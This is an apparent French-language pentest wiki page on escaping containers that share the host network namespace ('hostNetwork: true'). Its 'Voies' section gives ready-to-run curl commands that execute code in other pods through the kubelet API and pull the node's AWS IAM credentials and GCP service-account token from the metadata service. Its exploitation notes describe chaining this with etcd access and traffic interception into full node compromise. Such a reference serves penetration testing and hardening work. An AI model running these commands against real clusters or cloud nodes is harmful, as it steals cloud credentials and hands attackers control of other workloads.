---
title: "Espace de noms réseau de l'hôte : atteindre les services locaux au nœud et le trafic"
order: 2
description: "Un conteneur qui partage l'espace de noms réseau de l'hôte utilise les interfaces, le routage et le loopback de l'hôte. Cela expose les services liés à 127.0.0.1 sur le nœud, tels que l'API en lecture-écriture du kubelet, le service de métadonnées cloud et les démons d'administration locaux, et permet l'écoute et la liaison sur les interfaces de l'hôte, transformant la portée réseau en vol d'identifiants et compromission du nœud."
keywords:
  - hostnetwork
  - espace de noms réseau
  - kubelet api
  - service de métadonnées
  - évasion de conteneur
---

# Espace de noms réseau de l'hôte

`--net=host` ou `hostNetwork: true` place le conteneur directement sur la pile réseau de l'hôte : les mêmes interfaces, la même table de routage et, surtout, le même loopback. Les services qui se lient à `127.0.0.1` supposent que seuls des appelants locaux à l'hôte peuvent les atteindre, de sorte que partager l'espace de noms expose ces services au conteneur. Sur un nœud cloud ou un worker Kubernetes, c'est une voie directe vers le kubelet, le service de métadonnées et les démons de gestion locaux.

Confirmez et énumérez :

```bash
ip addr                                   # host interfaces (not a lone eth0/veth)
ss -tlnp 2>/dev/null                       # host-local listeners, including 127.0.0.1 ones
ip route                                   # host routing table
```

## Voies

```bash
# Kubelet read-write API on the node (often 10250): list pods, exec into them
curl -sk https://127.0.0.1:10250/pods | head
curl -sk -XPOST "https://127.0.0.1:10250/run/<ns>/<pod>/<container>" -d 'cmd=id'

# Cloud instance metadata: steal the node's role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Local-only admin services assumed unreachable from workloads
curl -s http://127.0.0.1:2379/version      # etcd, if bound to loopback
```

Les voies du kubelet et des métadonnées sont les plus précieuses : l'API du kubelet peut s'exécuter dans d'autres pods du nœud, et les identifiants de métadonnées sont l'identité cloud du nœud, permettant fréquemment de larges actions sur le compte.

## Notes d'exploitation

- Il s'agit d'une évasion par accessibilité : elle n'exécute pas de code sur l'hôte en soi, mais elle déverrouille des services dont l'authentification faible (un kubelet anonyme, un etcd ouvert, un point de terminaison de métadonnées distribuant des jetons) complète la compromission.
- Partager l'espace de noms permet également de se lier aux ports de l'hôte et d'écouter les interfaces de l'hôte, autorisant l'interception du trafic en clair local au nœud.
- Dans Kubernetes, les pods `hostNetwork` constituent une voie standard vers les identifiants du nœud ; combinez avec les voies des métadonnées et du kubelet sous [Évasion de pod vers nœud](../../orchestration/kubernetes/pod-escape-to-node/index.md).

## Références

- [man 7 network_namespaces](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Kubernetes : authn/authz du kubelet](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
- [HackTricks : network namespace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/network-namespace)
